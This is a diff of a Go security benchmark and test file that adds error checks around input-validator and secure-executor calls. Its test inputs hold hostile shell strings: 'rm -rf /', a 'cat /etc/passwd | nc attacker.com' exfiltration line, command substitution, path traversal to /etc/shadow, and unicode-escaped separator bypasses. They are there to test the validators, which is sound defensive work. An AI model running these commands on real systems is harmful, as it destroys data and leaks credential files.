@@ -37,15 +37,15 @@ type SecurityBenchmarkSuite struct {
 }
 
 type BenchmarkResult struct {
-	Name           string
-	Duration       time.Duration
-	Operations     int
-	OpsPerSecond   float64
-	AllocsPerOp    int64
-	BytesPerOp     int64
-	CPUUsage       float64
-	MemoryUsage    uint64
-	ErrorRate      float64
+	Name         string
+	Duration     time.Duration
+	Operations   int
+	OpsPerSecond float64
+	AllocsPerOp  int64
+	BytesPerOp   int64
+	CPUUsage     float64
+	MemoryUsage  uint64
+	ErrorRate    float64
 }
 
 type BenchmarkConfig struct {
@@ -120,7 +120,10 @@ func BenchmarkInputValidationPerformance(b *testing.B) {
 			b.Run(tc.name, func(b *testing.B) {
 				b.ResetTimer()
 				for i := 0; i < b.N; i++ {
-					suite.validator.ValidateCommandArgument(tc.input)
+					if err := suite.validator.ValidateCommandArgument(tc.input); err != nil {
+						// Error expected for malicious inputs in benchmark
+						_ = err
+					}
 				}
 			})
 		}
@@ -142,7 +145,10 @@ func BenchmarkInputValidationPerformance(b *testing.B) {
 			b.Run(tc.name, func(b *testing.B) {
 				b.ResetTimer()
 				for i := 0; i < b.N; i++ {
-					suite.validator.ValidateIPAddress(tc.input)
+					if err := suite.validator.ValidateIPAddress(tc.input); err != nil {
+						// Error expected for malicious inputs in benchmark
+						_ = err
+					}
 				}
 			})
 		}
@@ -164,7 +170,10 @@ func BenchmarkInputValidationPerformance(b *testing.B) {
 			b.Run(tc.name, func(b *testing.B) {
 				b.ResetTimer()
 				for i := 0; i < b.N; i++ {
-					suite.validator.ValidateFilePath(tc.input)
+					if err := suite.validator.ValidateFilePath(tc.input); err != nil {
+						// Error expected for malicious inputs in benchmark
+						_ = err
+					}
 				}
 			})
 		}
@@ -186,7 +195,10 @@ func BenchmarkInputValidationPerformance(b *testing.B) {
 			b.Run(tc.name, func(b *testing.B) {
 				b.ResetTimer()
 				for i := 0; i < b.N; i++ {
-					suite.validator.ValidateNetworkInterface(tc.input)
+					if err := suite.validator.ValidateNetworkInterface(tc.input); err != nil {
+						// Error expected for malicious inputs in benchmark
+						_ = err
+					}
 				}
 			})
 		}
@@ -201,7 +213,10 @@ func BenchmarkCommandExecutionSecurity(b *testing.B) {
 	b.Run("SecureExecute_Legitimate", func(b *testing.B) {
 		b.ResetTimer()
 		for i := 0; i < b.N; i++ {
-			suite.executor.SecureExecute(ctx, "ping", "-c", "1", "127.0.0.1")
+			if _, err := suite.executor.SecureExecute(ctx, "ping", "-c", "1", "127.0.0.1"); err != nil {
+				// Error handling for benchmark testing
+				_ = err
+			}
 		}
 	})
 
@@ -209,7 +224,10 @@ func BenchmarkCommandExecutionSecurity(b *testing.B) {
 		maliciousArgs := []string{"-c", "1", "127.0.0.1; rm -rf /"}
 		b.ResetTimer()
 		for i := 0; i < b.N; i++ {
-			suite.executor.SecureExecute(ctx, "ping", maliciousArgs...)
+			if _, err := suite.executor.SecureExecute(ctx, "ping", maliciousArgs...); err != nil {
+				// Error expected for malicious args in benchmark
+				_ = err
+			}
 		}
 	})
 
@@ -232,11 +250,16 @@ func BenchmarkCommandExecutionSecurity(b *testing.B) {
 			MaxArgs:     5,
 			Timeout:     100 * time.Millisecond,
 		}
-		suite.executor.RegisterCommand(shortCmd)
+		if err := suite.executor.RegisterCommand(shortCmd); err != nil {
+			b.Fatalf("Failed to register command: %v", err)
+		}
 
 		b.ResetTimer()
 		for i := 0; i < b.N; i++ {
-			suite.executor.SecureExecute(ctx, "echo", "test")
+			if _, err := suite.executor.SecureExecute(ctx, "echo", "test"); err != nil {
+				// Error handling for benchmark testing
+				_ = err
+			}
 		}
 	})
 }
@@ -319,7 +342,10 @@ func BenchmarkErrorHandlingPerformance(b *testing.B) {
 
 		b.ResetTimer()
 		for i := 0; i < b.N; i++ {
-			suite.errorHandler.HandleError(err, context)
+			if handledErr := suite.errorHandler.HandleError(err, context); handledErr != nil {
+				// Error handling in benchmark
+				_ = handledErr
+			}
 		}
 	})
 
@@ -333,7 +359,10 @@ func BenchmarkErrorHandlingPerformance(b *testing.B) {
 
 		b.ResetTimer()
 		for i := 0; i < b.N; i++ {
-			suite.errorHandler.HandleError(err, context)
+			if handledErr := suite.errorHandler.HandleError(err, context); handledErr != nil {
+				// Error handling in benchmark
+				_ = handledErr
+			}
 		}
 	})
 
@@ -388,7 +417,10 @@ func BenchmarkConcurrentSecurityOperations(b *testing.B) {
 				i := 0
 				for pb.Next() {
 					arg := fmt.Sprintf("test_arg_%d", i%1000)
-					suite.validator.ValidateCommandArgument(arg)
+					if err := suite.validator.ValidateCommandArgument(arg); err != nil {
+						// Error expected for some inputs in benchmark
+						_ = err
+					}
 					i++
 				}
 			})
@@ -413,7 +445,10 @@ func BenchmarkConcurrentSecurityOperations(b *testing.B) {
 			b.SetParallelism(concurrency)
 			b.RunParallel(func(pb *testing.PB) {
 				for pb.Next() {
-					suite.errorHandler.HandleError(err, context)
+					if handledErr := suite.errorHandler.HandleError(err, context); handledErr != nil {
+						// Error handling in benchmark
+						_ = handledErr
+					}
 				}
 			})
 		})
@@ -434,7 +469,10 @@ func BenchmarkMemoryUsageUnderAttack(b *testing.B) {
 		b.ResetTimer()
 		for i := 0; i < b.N; i++ {
 			longInput := strings.Repeat("A", 10000)
-			suite.validator.ValidateCommandArgument(longInput)
+			if err := suite.validator.ValidateCommandArgument(longInput); err != nil {
+				// Error expected for malicious inputs in benchmark
+				_ = err
+			}
 		}
 
 		// Measure memory after
@@ -460,9 +498,18 @@ func BenchmarkMemoryUsageUnderAttack(b *testing.B) {
 		b.ResetTimer()
 		for i := 0; i < b.N; i++ {
 			input := maliciousInputs[i%len(maliciousInputs)]
-			suite.validator.ValidateCommandArgument(input)
-			suite.validator.ValidateIPAddress(input)
-			suite.validator.ValidateFilePath(input)
+			if err := suite.validator.ValidateCommandArgument(input); err != nil {
+				// Error expected for malicious inputs in benchmark
+				_ = err
+			}
+			if err := suite.validator.ValidateIPAddress(input); err != nil {
+				// Error expected for malicious inputs in benchmark
+				_ = err
+			}
+			if err := suite.validator.ValidateFilePath(input); err != nil {
+				// Error expected for malicious inputs in benchmark
+				_ = err
+			}
 		}
 
 		runtime.GC()
@@ -509,7 +556,10 @@ func BenchmarkSecurityVsFunctionality(b *testing.B) {
 	b.Run("SecuredCommandValidation", func(b *testing.B) {
 		b.ResetTimer()
 		for i := 0; i < b.N; i++ {
-			suite.validator.ValidateCommandArgument("test_command_arg")
+			if err := suite.validator.ValidateCommandArgument("test_command_arg"); err != nil {
+				// Error handling for benchmark testing
+				_ = err
+			}
 		}
 	})
 
@@ -536,7 +586,10 @@ func BenchmarkSecurityVsFunctionality(b *testing.B) {
 		// Simulate unsecured HTTP handler
 		handler := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
 			w.WriteHeader(http.StatusOK)
-			w.Write([]byte(`{"status":"ok"}`))
+			if _, err := w.Write([]byte(`{"status":"ok"}`)); err != nil {
+				// Error writing response in benchmark
+				_ = err
+			}
 		})
 
 		req := httptest.NewRequest("GET", "/health", nil)
@@ -631,7 +684,9 @@ func BenchmarkCryptographicOperations(b *testing.B) {
 		buffer := make([]byte, 32)
 		b.ResetTimer()
 		for i := 0; i < b.N; i++ {
-			rand.Read(buffer)
+			if _, err := rand.Read(buffer); err != nil {
+				b.Fatalf("Failed to read random data: %v", err)
+			}
 		}
 	})
 
@@ -671,7 +726,10 @@ func BenchmarkWorstCaseScenarios(b *testing.B) {
 		maxInput := strings.Repeat("A", 10000) // Assuming 10KB max
 		b.ResetTimer()
 		for i := 0; i < b.N; i++ {
-			suite.validator.ValidateCommandArgument(maxInput)
+			if err := suite.validator.ValidateCommandArgument(maxInput); err != nil {
+				// Error expected for maximum input size in benchmark
+				_ = err
+			}
 		}
 	})
 
@@ -680,7 +738,10 @@ func BenchmarkWorstCaseScenarios(b *testing.B) {
 		maliciousInput := "test; rm -rf / && cat /etc/passwd | nc attacker.com 1234 & $(whoami) `id` ../../../etc/shadow"
 		b.ResetTimer()
 		for i := 0; i < b.N; i++ {
-			suite.validator.ValidateCommandArgument(maliciousInput)
+			if err := suite.validator.ValidateCommandArgument(maliciousInput); err != nil {
+				// Error expected for malicious input in benchmark
+				_ = err
+			}
 		}
 	})
 
@@ -697,22 +758,28 @@ func BenchmarkWorstCaseScenarios(b *testing.B) {
 		b.ResetTimer()
 		for i := 0; i < b.N; i++ {
 			attack := attacks[i%len(attacks)]
-			suite.validator.ValidateCommandArgument(attack)
+			if err := suite.validator.ValidateCommandArgument(attack); err != nil {
+				// Error expected for attack input in benchmark
+				_ = err
+			}
 		}
 	})
 
 	b.Run("UnicodeSecurityBypass", func(b *testing.B) {
 		// Test performance with unicode-based bypass attempts
 		unicodeAttacks := []string{
-			"test\u003Brm -rf /",      // Unicode semicolon
+			"test\u003Brm -rf /",        // Unicode semicolon
 			"test\u007Ccat /etc/passwd", // Unicode pipe
-			"test\u0026rm -rf /",      // Unicode ampersand
+			"test\u0026rm -rf /",        // Unicode ampersand
 		}
 
 		b.ResetTimer()
 		for i := 0; i < b.N; i++ {
 			attack := unicodeAttacks[i%len(unicodeAttacks)]
-			suite.validator.ValidateCommandArgument(attack)
+			if err := suite.validator.ValidateCommandArgument(attack); err != nil {
+				// Error expected for attack input in benchmark
+				_ = err
+			}
 		}
 	})
 }
@@ -728,11 +795,11 @@ func TestSecurityPerformanceRegression(t *testing.T) {
 
 	// Define performance thresholds (these should be calibrated based on your requirements)
 	thresholds := map[string]time.Duration{
-		"command_validation":  1 * time.Millisecond,
-		"ip_validation":       500 * time.Microsecond,
-		"path_validation":     800 * time.Microsecond,
-		"http_request":        5 * time.Millisecond,
-		"error_handling":      2 * time.Millisecond,
+		"command_validation": 1 * time.Millisecond,
+		"ip_validation":      500 * time.Microsecond,
+		"path_validation":    800 * time.Microsecond,
+		"http_request":       5 * time.Millisecond,
+		"error_handling":     2 * time.Millisecond,
 	}
 
 	testCases := []struct {
@@ -745,7 +812,10 @@ func TestSecurityPerformanceRegression(t *testing.T) {
 			operation: func() time.Duration {
 				start := time.Now()
 				for i := 0; i < 1000; i++ {
-					suite.validator.ValidateCommandArgument("test_arg")
+					if err := suite.validator.ValidateCommandArgument("test_arg"); err != nil {
+						// Error handling in regression test
+						_ = err
+					}
 				}
 				return time.Since(start) / 1000
 			},
@@ -756,7 +826,10 @@ func TestSecurityPerformanceRegression(t *testing.T) {
 			operation: func() time.Duration {
 				start := time.Now()
 				for i := 0; i < 1000; i++ {
-					suite.validator.ValidateIPAddress("192.168.1.1")
+					if err := suite.validator.ValidateIPAddress("192.168.1.1"); err != nil {
+						// Error handling in regression test
+						_ = err
+					}
 				}
 				return time.Since(start) / 1000
 			},
@@ -767,7 +840,10 @@ func TestSecurityPerformanceRegression(t *testing.T) {
 			operation: func() time.Duration {
 				start := time.Now()
 				for i := 0; i < 1000; i++ {
-					suite.validator.ValidateFilePath("/tmp/test.txt")
+					if err := suite.validator.ValidateFilePath("/tmp/test.txt"); err != nil {
+						// Error handling in regression test
+						_ = err
+					}
 				}
 				return time.Since(start) / 1000
 			},
@@ -793,7 +869,10 @@ func TestSecurityPerformanceRegression(t *testing.T) {
 				context := map[string]interface{}{"test": "regression"}
 				start := time.Now()
 				for i := 0; i < 1000; i++ {
-					suite.errorHandler.HandleError(err, context)
+					if handledErr := suite.errorHandler.HandleError(err, context); handledErr != nil {
+						// Error handling in benchmark
+						_ = handledErr
+					}
 				}
 				return time.Since(start) / 1000
 			},
@@ -842,9 +921,18 @@ func TestSecurityResourceLimits(t *testing.T) {
 		// Simulate heavy load
 		for i := 0; i < 10000; i++ {
 			maliciousInput := strings.Repeat("malicious;", 100)
-			suite.validator.ValidateCommandArgument(maliciousInput)
-			suite.validator.ValidateIPAddress("192.168.1.1; attack")
-			suite.validator.ValidateFilePath("../../../etc/passwd")
+			if err := suite.validator.ValidateCommandArgument(maliciousInput); err != nil {
+				// Error expected for malicious input in benchmark
+				_ = err
+			}
+			if err := suite.validator.ValidateIPAddress("192.168.1.1; attack"); err != nil {
+				// Error expected for malicious IP in resource limit test
+				_ = err
+			}
+			if err := suite.validator.ValidateFilePath("../../../etc/passwd"); err != nil {
+				// Error expected for malicious path in resource limit test
+				_ = err
+			}
 
 			// Force garbage collection periodically
 			if i%1000 == 0 {
@@ -872,7 +960,10 @@ func TestSecurityResourceLimits(t *testing.T) {
 		// Simulate CPU-intensive attack
 		for i := 0; i < 50000; i++ {
 			complexMaliciousInput := fmt.Sprintf("test_%d; rm -rf / && cat /etc/passwd | nc attacker.com %d", i, i%65535)
-			suite.validator.ValidateCommandArgument(complexMaliciousInput)
+			if err := suite.validator.ValidateCommandArgument(complexMaliciousInput); err != nil {
+				// Error expected for complex malicious input in resource limit test
+				_ = err
+			}
 		}
 
 		duration := time.Since(start)
@@ -896,7 +987,10 @@ func TestSecurityResourceLimits(t *testing.T) {
 			go func(id int) {
 				defer wg.Done()
 				for j := 0; j < 10; j++ {
-					suite.validator.ValidateCommandArgument(fmt.Sprintf("test_%d_%d", id, j))
+					if err := suite.validator.ValidateCommandArgument(fmt.Sprintf("test_%d_%d", id, j)); err != nil {
+						// Error handling in goroutine leak test
+						_ = err
+					}
 					time.Sleep(1 * time.Millisecond)
 				}
 			}(i)
@@ -928,12 +1022,18 @@ func BenchmarkComparisonReport(b *testing.B) {
 	}{
 		{"InputValidation", func(b *testing.B) {
 			for i := 0; i < b.N; i++ {
-				suite.validator.ValidateCommandArgument("test_arg")
+				if err := suite.validator.ValidateCommandArgument("test_arg"); err != nil {
+					// Error handling in benchmark comparison report
+					_ = err
+				}
 			}
 		}},
 		{"MaliciousInputValidation", func(b *testing.B) {
 			for i := 0; i < b.N; i++ {
-				suite.validator.ValidateCommandArgument("test; rm -rf /")
+				if err := suite.validator.ValidateCommandArgument("test; rm -rf /"); err != nil {
+					// Error expected for malicious input in benchmark comparison report
+					_ = err
+				}
 			}
 		}},
 		{"HTTPSecurityMiddleware", func(b *testing.B) {
@@ -947,7 +1047,10 @@ func BenchmarkComparisonReport(b *testing.B) {
 			err := fmt.Errorf("test error")
 			context := map[string]interface{}{"test": "benchmark"}
 			for i := 0; i < b.N; i++ {
-				suite.errorHandler.HandleError(err, context)
+				if handledErr := suite.errorHandler.HandleError(err, context); handledErr != nil {
+					// Error handling in benchmark
+					_ = handledErr
+				}
 			}
 		}},
 		{"ConcurrentValidation", func(b *testing.B) {
@@ -955,7 +1058,10 @@ func BenchmarkComparisonReport(b *testing.B) {
 			b.RunParallel(func(pb *testing.PB) {
 				i := 0
 				for pb.Next() {
-					suite.validator.ValidateCommandArgument(fmt.Sprintf("test_%d", i))
+					if err := suite.validator.ValidateCommandArgument(fmt.Sprintf("test_%d", i)); err != nil {
+						// Error handling in concurrent validation test
+						_ = err
+					}
 					i++
 				}
 			})
